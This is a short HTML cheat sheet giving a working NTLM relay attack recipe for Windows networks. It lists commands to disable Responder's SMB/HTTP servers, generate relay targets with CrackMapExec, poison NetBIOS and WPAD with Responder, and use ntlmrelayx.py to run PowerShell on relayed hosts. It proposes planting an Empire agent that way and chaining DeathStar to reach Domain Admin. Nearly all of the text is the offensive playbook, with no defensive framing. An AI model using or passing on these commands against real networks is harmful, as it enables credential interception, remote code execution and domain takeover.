<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>TLDR</title>
</head><body>Set up responder.py<br/>
	Turn off SMB and HTTP in Reponder.conf<br/>
	This forces responder to use NTLMrelayx instead of its own internal servers<br/>
Set up ntlmrelayx.py<br/>
<br/>
Generate targets with CrackMapExec:<br/>
	cme smb &lt;CIDR&gt; --gen-relay-list targets.txt<br/>
<br/>
Terminal 1:<br/>
	python Responder.py -I &lt;interface&gt; -r -d -w<br/>
	-r respond to netbios wredir suffix queries<br/>
	-d respond to netbios domain suffix queries<br/>
	-w start rogue WPAD server<br/>
Terminal 2:<br/>
	ntlmrelayx.py -tf targets.txt -c &lt;Powershell Code&gt;<br/>
	How about an empire agent? <br/>
<br/>
Recap<ul><li>We're using <a href="https://github.com/lgandx/Responder">Responder</a> to poison/spoof/intercept authentication attempts (Net-NTLM hashes) via Multicast/Broadcast protocols.</li>
<li>However, since we turned off <a href="https://github.com/lgandx/Responder">Responder's</a> SMB and HTTP servers and have <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a> running, those authentication attempts get automatically passed to <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py's</a> SMB and HTTP servers</li>
<li><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a> takes over and relays those hashes to our target list. If the relay is successful it will execute our Empire launcher and give us an Empire Agent on the target machine.</li>
</ul>
<br/>
Now, combine this with something like DeathStar and you have automated everything from getting a foothold to gaining Domain Admin rights!</body></html>